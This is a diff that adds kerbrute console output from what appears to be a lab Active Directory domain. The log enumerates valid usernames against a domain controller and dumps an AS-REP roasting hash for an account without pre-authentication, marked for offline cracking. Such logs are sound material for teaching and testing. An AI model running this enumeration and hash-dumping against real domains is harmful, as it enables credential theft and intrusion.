@@ -1,0 +1,19 @@
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 11/15/26 - Ronnie Flathers @ropnop
+
+2026/11/15 10:20:00 >  Using KDC(s):[0m
+2026/11/15 10:20:00 >  	192.168.56.90:88
+[0m
+[32m2026/11/15 10:20:01 >  [+] VALID USERNAME:	 robin.arryn@vale.sevenkingdoms.local[0m
+[32m2026/11/15 10:20:01 >  [+] mya.stone has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mya.stone@VALE.SEVENKINGDOMS.LOCAL:7c1e5a9f03b2d4e68a1f0c3b5d7e9a2c$4e8a2c6f0b1d3e5a7c9e1b3d5f7a9c0e2b4d6f8a0c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d0f2a4c6e8b0d1f3a5c7e9b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a3c5e7b9d1f[0m
+[32m2026/11/15 10:20:01 >  [+] VALID USERNAME:	 mya.stone@vale.sevenkingdoms.local[0m
+[32m2026/11/15 10:20:01 >  [+] VALID USERNAME:	 yohn.royce@vale.sevenkingdoms.local[0m
+[32m2026/11/15 10:20:01 >  [+] VALID USERNAME:	 lothor.brune@vale.sevenkingdoms.local[0m
+2026/11/15 10:20:01 >  Done! Tested 9 usernames (4 valid) in 0.318 seconds[0m
